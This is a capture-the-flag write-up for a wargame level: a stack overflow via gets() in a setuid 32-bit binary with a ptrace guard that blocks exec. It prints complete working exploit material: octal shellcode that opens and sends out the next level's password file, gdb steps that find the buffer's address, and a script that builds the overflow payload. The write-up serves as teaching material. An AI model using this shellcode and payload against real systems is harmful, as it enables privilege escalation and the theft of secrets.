# OverRide (level04)

In this project, we try to **exploit binaries** with the intent of reading the `/home/users/level<n+1>/.pass` file, containing our flag serving as the password for the next level.

# Binary

Binary properties:
- Full path: `/home/users/level04/level04`
- Type: **ELF 32-bit LSB executable** (`file -b ~/level04`)

To analyze its content we generated two files:
- [source.c](./source.c): generated with our [ghidra.sh](../common/ghidra/ghidra.sh), wrapping a [Ghidra](https://github.com/nationalsecurityagency/ghidra)-based [docker container](https://hub.docker.com/r/blacktop/ghidra).
- [source.asm](./source.asm): trimmed after being generated through `objdump -D ~/level04`.

# Security

Let's connect to the server through [ssh](./Ressources/ssh.sh) and inspect the protections in place.

## File Attributes

```sh
$ ls -la ~/level04
-rwsr-s---+ 1 level05 users 7797 Sep 10  2016 /home/users/level04/level04
```

|    Attribute    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|    Suid bit     |    ✅     | Owned by level05, so it runs with level05's effective uid: opening a shell inherits it.


## Compile-Time

```sh
$ checksec --file ~/level04
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level04/level04
```

|   Protection    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|      RELRO      |    ⚠️     | Partial. GOT is still writable but harder to reach.
|  Stack Canary   |    ❌     | Stack buffer overflows are possible.
|       NX        |    ❌     | Stack/Heap are executable. Shellcode injection is possible.
|       PIE       |    ❌     | The stack's position is predictable.
| RPATH / RUNPATH |    ❌     | No custom library search path to hijack.

## Kernel Run-Time

```sh
$ cat /proc/sys/kernel/randomize_va_space
0
```

|   Protection    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|      ASLR       |    ❌     | Stack and heap addresses are stable across runs.

## Documentation

Reference material for the concepts above:
- Setuid flag (Suid): https://fr.wikipedia.org/wiki/Setuid
- Relocation Read-Only (RELRO): https://ctf101.org/binary-exploitation/relocation-read-only/
- Stack canary: https://ctf101.org/binary-exploitation/stack-canaries/
- No eXecute (NX): https://ctf101.org/binary-exploitation/no-execute/
- Position Independent Code (PIE): https://en.wikipedia.org/wiki/Position-independent_code
- RUNPATH & RPATH: https://en.wikipedia.org/wiki/Rpath
- Address Space Layout Randomization (ASLR): https://ctf101.org/binary-exploitation/address-space-layout-randomization/

# Vulnerability & Analysis

The decompiled binary (cf. [source](source.c)) is subject to a "Use of Inherently Dangerous Function" ([CWE-242](https://cwe.mitre.org/data/definitions/242.html)) due to the call of `gets()`.

`gets()` reads unbounded input into a 128-byte stack buffer. The saved return address sits above that buffer, so a long enough input overflows it and lets us redirect execution flow to shellcode we inject into the stack *(no ASLR, no NX, no Canaries...)*.

The overflow and thus the shellcode based execution flow hijacking happens in the child process, which owns its own copy of the stack/heap.

The parent traces the child and peeks at its syscall attempts.  
The kernel blocks the child once any kind of `exec` is made, and because the parent never tells it to resume, the child stays locked until it is killed on timeout.

This stop is a built-in `ptrace` feature as seen in it's [man page](https://man7.org/linux/man-pages/man2/ptrace.2.html).
```sh
If the PTRACE_O_TRACEEXEC option is not in effect, all successful
calls to execve(2) by the traced process will cause it to be sent
a SIGTRAP signal, giving the parent a chance to gain control
before the new program begins execution.
```

`execve` and `execveat` being disallowed, we need to find different [syscall(s)](https://x86.syscall.sh/) we can take advantage of to extract the data present in `/home/users/level05/.pass`:
- `sys_open` -> `sys_sendfile`.
- `sys_open` -> `sys_read` -> `sys_write`.

# Exploit

The script itself invites us to inject malicious shellcode and redirect execution flow to it: `puts("Give me some shellcode, k")`.

We express our shellcode in `.asm` as it is simpler and we'll use a script to transform it to a little-endian octal sequence to represent the following chain of commands: `sys_open("////home/users/level05/.pass", O_RDONLY, 0); sys_sendfile(1, fd, NULL, -1); sys_exit(1);`. 

When we generate it, we discover it's **75** bytes long *(assuming the file is kept in sync)*.
```sh
$ tmpdir=$(mktemp -d);
$ asm_payload_filepath="./data/exploit.asm";
# Compile the assembly program to an object file.
$ nasm -f elf32 "$asm_payload_filepath" -o "$tmpdir/exploit.o";
# Link the object file into a binary.
$ ld -m elf_i386 -e _start "$tmpdir/exploit.o" -o "$tmpdir/exploit.bin";
# Extract the content of the ELF .text section as raw bytes.
$ objcopy -j .text -O binary "$tmpdir/exploit.bin" "$tmpdir/shellcode.bin";
# Format the bytes into an octal shellcode payload.
# We use octal because dash's printf implementation does not support the '\xHH' escape format.
$ octal_shellcode=$(hexdump -v -e '"\\" 1/1 "%03o"' "$tmpdir/shellcode.bin");
# \061\300\120\150\160\141\163\163\150\060\065\057\056\150\145\166\145\154\150\162\163\057\154\150\057\165\163\145\150\150\157\155\145\150\057\057\057\057\211\343\061\311\061\322\260\005\315\200\211\301\061\333\263\001\061\322\061\366\116\061\300\260\273\315\200\061\333\263\001\061\300\260\001\315\200
$ octal_shellcode_byte_length=$(printf "%b" "$octal_shellcode" | wc -c);
# 75
```

We place our **75-byte shellcode** at the start of the 128-byte buffer.  
This means that when we overwrite `main()`'s return address with the shellcode's address it would be the same as the buffer's.  

We now have to figure out:
- the address of our buffer.
- how many overflown bytes are necessary to reach `main()`'s saved return address.

## Finding the address of `main()`'s return address.

We must measure under the **exact same conditions as the live run** (`env -i ~/level04`), otherwise
the stack layout (and thus every address) drifts and the strict jump misses. We force gdb to launch
the target through `env -i` (empty environment) with the identical `argv[0]`, so the measured
addresses are byte-for-byte what we'll see at runtime — no NOP sled needed.

```sh
$ gdb -q -batch \
  -ex 'set follow-fork-mode child' \
  -ex 'set exec-wrapper env -i' \
  -ex 'break main' \
  -ex 'run < /dev/null' \
  -ex 'printf "ret_addr = %#x\n", $ebp + 0x4' \
  --args /home/users/level04/level04 | grep ret_addr;
ret_addr = 0xffffde5c
# the saved return address sits just above the saved $ebp, which is 4 bytes wide on 32-bit.
# `set exec-wrapper env -i` makes gdb's stack identical to the live `env -i ~/level04` invocation.
```

## Finding the address of the buffer/shellcode.

We know the address of `main()`'s return address.  
Using a cyclic pattern, we can derive the address of `buffer` from its offset to that return address.

We'll use this online tool to generate one: [wiremask.eu](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)

```sh
$ cyclic_pattern='Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'; # 200 chars.
$ printf '%s' "$cyclic_pattern" | gdb -q -batch \
  -ex 'set follow-fork-mode child' \
  -ex 'set exec-wrapper env -i' \
  -ex 'run' \
  -ex 'printf "eip = %#x\n", $eip' \
  --args /home/users/level04/level04 | grep eip;
eip = 0x41326641

# Given this value of eip, wiremask.eu tells us there is a 156-byte offset.
# So buffer sits 156 bytes below the saved return address:
#   buffer = ret_addr - 156 = 0xffffde5c - 0x9c = 0xffffddc0
```

Based on the retrieved addresses, we can define `buffer`'s address as: `0xffffde5c` - `0x9c` = `0xffffddc0`.
It can be represented the following way as a little-endian octal sequence: `\300\335\377\377`

## Solution

```sh
shellcode="$(generate_shellcode)"; # \061\300\120\150\160\141\163\163\150\060\065\057\056\150\145\166\145\154\150\162\163\057\154\150\057\165\163\145\150\150\157\155\145\150\057\057\057\057\211\343\061\311\061\322\260\005\315\200\211\301\061\333\263\001\061\322\061\366\116\061\300\260\273\315\200\061\333\263\001\061\300\260\001\315\200
shellcode_length="$(printf '%b' "$shellcode" | wc -c)"; # 75
shellcode_addr='\300\335\377\377'
ret_addr_length="$(printf '%b' "$shellcode_addr" | wc -c)"; # 4
total_payload_length='160';
padding_length="$((total_payload_length - shellcode_length - ret_addr_length))"; # 160 - 75 - 4 = 81
padding="$(printf '%*s' "$padding_length" '' | tr ' ' 'A')";
printf '%b%s%b' "$shellcode" "$padding" "$shellcode_addr";
```

And there we are !
